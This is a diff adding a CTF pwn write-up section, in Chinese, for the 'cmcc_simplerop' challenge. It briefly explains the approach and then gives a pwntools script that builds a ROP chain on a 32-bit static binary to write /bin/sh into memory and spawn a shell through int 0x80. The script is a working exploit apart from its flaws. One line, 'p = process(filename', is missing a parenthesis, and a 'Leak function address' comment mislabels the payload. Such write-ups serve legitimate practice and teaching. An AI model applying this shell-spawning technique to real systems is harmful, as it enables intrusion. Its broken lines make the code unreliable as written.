@@ -373,3 +373,41 @@ payload += b'\x00'*(0x60-0x18-len(payload)) + p64(0x00400e88)
 p.sendlineafter(b'password: ', payload)
 p.interactive()
 ```
+
+### cmcc_simplerop
+
+```
+cmcc_simplerop: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=bdd40d725b490b97d5a25857a6273870c7de399f, not stripped
+```
+
+程序是静态链接的，体积比一般的题目大，而且符号表里没有system，ROPgadget也没有找到/bin/sh，所以需要把/bin/sh写入到一个固定的地址、然后通过中断`int 0x80`触发系统调用。
+
+```python3
+#!/usr/bin/python3
+from pwn import *
+# from LibcSearcher import LibcSearcher
+
+filename = './cmcc_simplerop'
+p = process(filename
+elf = ELF(filename)
+
+# pop eax; ret
+pop_eax_ret = 0x080bae06
+writable_addr = 0x080eb000+0x1000
+# pop edx ; ret
+pop_edx_ret = 0x0806e82a
+# pop ebp ; pop esi ; pop edi ; ret
+pop_3_ret = 0x0809de85
+# pop ecx ; pop ebx ; ret
+pop_ecx_ebx_ret = 0x0806e851
+# int 0x80
+int_addr = 0x080493e1
+
+# Leak function address 
+payload = b'\x33'*(0x1c+0x4) + \
+    p32(elf.sym['read']) + p32(pop_3_ret) + p32(0) + p32(writable_addr) + p32(0x10) + \
+    p32(pop_eax_ret) + p32(0xb) + p32(pop_ecx_ebx_ret) + p32(writable_addr+0x8) + p32(writable_addr) + p32(pop_edx_ret) + p32(writable_addr+0x8) + p32(int_addr)
+p.sendlineafter(b'Your input :', payload)
+p.send(b'/bin/sh\x00'+p32(writable_addr + 8)+p32(0))
+p.interactive()
+```
